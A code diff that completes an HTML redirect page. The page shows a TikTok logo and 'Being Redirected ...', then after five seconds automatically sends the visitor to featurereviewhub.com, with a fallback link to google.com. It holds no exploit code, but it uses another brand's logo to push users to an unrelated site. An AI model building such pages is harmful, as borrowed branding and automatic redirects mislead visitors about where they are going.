@@ -1,6 +1,14 @@
-    <img id="tiktok-logo" src="../i.ibb.co/5MMGFNf/1000-F-344600545-4j-FBe-Ak5l8-Kug2-Uyxq-OEoop8p1-I0v1dp-removebg-preview.png" alt="TikTok Logo" />
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Example</title>
+</head>
+<body>
+    <img id="tiktok-logo" src="https://i.ibb.co/5MMGFNf/1000-F-344600545-4j-FBe-Ak5l8-Kug2-Uyxq-OEoop8p1-I0v1dp-removebg-preview.png" alt="TikTok Logo" />
     <p id="redirect-text">Being Redirected ...</p>
-    <a href="www.google.html" id="openLink">Click Me to Open in Chrome (Android) or Safari (iOS)</a>
+    <a href="https://www.google.com" id="openLink">Click Me to Open in Chrome (Android) or Safari (iOS)</a>
 
     <script>
         function openLinkBasedOnDevice(url) {
@@ -22,8 +30,7 @@
         setTimeout(function () {
             var url = 'https://featurereviewhub.com/';
             openLinkBasedOnDevice(url);
-        }, 500); // 500 milliseconds = 5 seconds
+        }, 5000); // 5000 milliseconds = 5 seconds
     </script>
-
-
-</!doctype>
+</body>
+</html>
